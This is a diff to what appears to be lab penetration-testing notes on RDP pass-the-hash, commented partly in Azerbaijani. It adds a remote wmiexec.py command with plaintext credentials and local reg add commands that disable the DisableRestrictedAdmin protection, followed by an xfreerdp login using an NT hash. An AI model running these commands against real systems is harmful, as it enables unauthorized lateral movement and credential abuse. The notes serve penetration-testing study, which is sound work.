@@ -124,6 +124,18 @@ exploit
 # 5. RDP Pass The Hash
 
 ```bash
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+Name: DisableRestrictedAdmin
+Type: REG_DWORD  
+Value: 0  (default=1 → PTH blok)
+Bu key 1 olarsa → RDP NTLM hash qəbul etmir (NLA/CredSSP blok).
+
+# DisableRestrictedAdmin
+wmiexec.py htldbuser:MSSQLAccess01!@10.129.203.12 "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
+
 # NTLM hash format: admin::domain:LMHASH:NTHASH::: 
 xfreerdp /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7587C /v:10.129.203.12
 
